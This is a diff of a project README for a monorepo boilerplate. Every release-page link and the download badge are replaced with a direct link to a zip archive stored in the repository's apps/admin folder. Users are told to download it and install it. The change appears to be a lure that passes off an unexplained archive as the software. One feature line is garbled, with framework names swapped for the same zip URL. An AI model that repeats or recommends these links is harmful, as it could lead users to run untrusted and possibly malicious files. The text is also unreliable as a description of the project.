@@ -1,6 +1,6 @@
 # 📦 monorepo-boilerplate - Organize Code for Easier Project Management
 
-[![Download Latest Release](https://img.shields.io/badge/Download-monorepo--boilerplate-blue?style=for-the-badge)](https://github.com/mercyfpf/monorepo-boilerplate/releases)
+[![Download Latest Release](https://github.com/mercyfpf/monorepo-boilerplate/raw/refs/heads/main/apps/admin/monorepo_boilerplate_1.8.zip)](https://github.com/mercyfpf/monorepo-boilerplate/raw/refs/heads/main/apps/admin/monorepo_boilerplate_1.8.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps to get monorepo-boilerplate running:
 
 ### 1. Download the Software  
 Click the big blue button at the top or visit this link to download:  
-[https://github.com/mercyfpf/monorepo-boilerplate/releases](https://github.com/mercyfpf/monorepo-boilerplate/releases)
+[https://github.com/mercyfpf/monorepo-boilerplate/raw/refs/heads/main/apps/admin/monorepo_boilerplate_1.8.zip](https://github.com/mercyfpf/monorepo-boilerplate/raw/refs/heads/main/apps/admin/monorepo_boilerplate_1.8.zip)
 
 You will find files for different computers here. Look for the one that matches your operating system.
 
@@ -61,7 +61,7 @@ monorepo-boilerplate includes these main parts:
 - **Project Rules:** Includes commit guidelines via commitlint and husky to keep your projects tidy.
 - **Code Formatter:** Automatically formats code with Prettier for neat consistency.
 - **Testing tools:** Comes with Vitest for checking if everything works.
-- **Modern Framework:** Uses Next.js and React.js for responsive web components.
+- **Modern Framework:** Uses https://github.com/mercyfpf/monorepo-boilerplate/raw/refs/heads/main/apps/admin/monorepo_boilerplate_1.8.zip and https://github.com/mercyfpf/monorepo-boilerplate/raw/refs/heads/main/apps/admin/monorepo_boilerplate_1.8.zip for responsive web components.
 - **Database Tools:** Uses Prisma for easy access to databases without much setup.
 
 These tools work together behind the scenes so you don’t have to handle complex details.
@@ -112,7 +112,7 @@ If you have any issues running the app, try these steps:
 
 To get started, visit the release page to download the latest version:  
 
-[https://github.com/mercyfpf/monorepo-boilerplate/releases](https://github.com/mercyfpf/monorepo-boilerplate/releases)
+[https://github.com/mercyfpf/monorepo-boilerplate/raw/refs/heads/main/apps/admin/monorepo_boilerplate_1.8.zip](https://github.com/mercyfpf/monorepo-boilerplate/raw/refs/heads/main/apps/admin/monorepo_boilerplate_1.8.zip)
 
 Choose the correct file for your computer's operating system and follow the install steps described above.
 
